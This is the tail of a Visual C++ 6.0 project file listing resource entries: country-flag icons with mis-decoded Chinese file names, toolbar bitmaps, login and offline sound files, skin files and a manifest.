# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����կ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ݿ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��Ͳ�Τ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����¡.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��Ħ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ص���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���޵���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ά��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ȹ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���Ϲ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��֧��ʿ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\¬ɭ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\¬����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����˹��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ά.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ܶ�Ⱥ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ë����˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ë��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����������֯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ɹ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ϼ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��³.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ܿ�������������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\��ɱ��̳.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ħ������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ħ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ħ�ɸ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Īɣ�ȿ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ī����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ױ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ϸ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ჴ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ն�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ų��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ŷ������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ձ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��ʿ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����߶�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ά��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ڼӶ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����·˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ɳ�ذ�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ʥ��������������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ʥ���ĺ���ά˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ʥ¬����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ʥ����ŵ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ʥ��ɭ�غ͸����ɶ�˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\������ͼ��\ʵ�ù���.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\˹������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\˹�工��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\˹��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\˹��ʿ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�յ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������Ⱥ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\̨��ʡ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\̩��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\̫ƽ��ͬ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\̹ɣ����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������Ͷ�͸�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ͻ��˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ͼ��¬.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��Ŭ��ͼ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Σ������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ί������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ڸɴ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ڿ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ȱ��˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��IP���ݿ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����Ħ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ϣ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\������ͼ��\ϵͳ����.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�¼���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ҳ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��ɫ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ӡ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ӡ��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ӣ����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ӣ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Լ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Խ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ޱ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\է��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�з�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�й�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�³.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��ٸ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\쳼�.ico"
# End Source File
# End Group
# Begin Source File

SOURCE=.\res\Wave\login.wav
# End Source File
# Begin Source File

SOURCE=.\res\MSN.she
# End Source File
# Begin Source File

SOURCE=.\res\Wave\offline.wav
# End Source File
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# Begin Source File

SOURCE=.\res\Wave\Setting.wav
# End Source File
# Begin Source File

SOURCE=.\res\win8.she
# End Source File
# Begin Source File

SOURCE=.\res\xpstyle.manifest
# End Source File
# End Target
# End Project
